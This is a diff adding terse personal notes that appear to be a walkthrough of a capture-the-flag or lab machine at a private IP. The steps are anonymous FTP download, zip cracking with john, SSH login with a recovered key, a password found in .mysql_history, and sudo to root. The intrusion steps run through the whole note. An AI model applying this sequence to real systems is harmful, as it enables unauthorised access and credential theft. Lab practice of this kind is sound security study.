@@ -1,0 +1,22 @@
+192.168.56.111 
+
+ftp@192.168.56.111
+anonymous
+mget * (to download all files)
+
+zip2john tom.zip > tom_hash
+john tom_hash
+unzip tom.zip
+chmod 600 id_rsa
+ssh -i id_rsa tom@192.168.x.x
+ls 
+sudo -l (failed dont know the password)
+
+check 
+ls -la
+check .bash_history (no l uck)
+chekc .mysql_history 
+got password 
+
+sudo -l (use the password 
+get root access sudo su
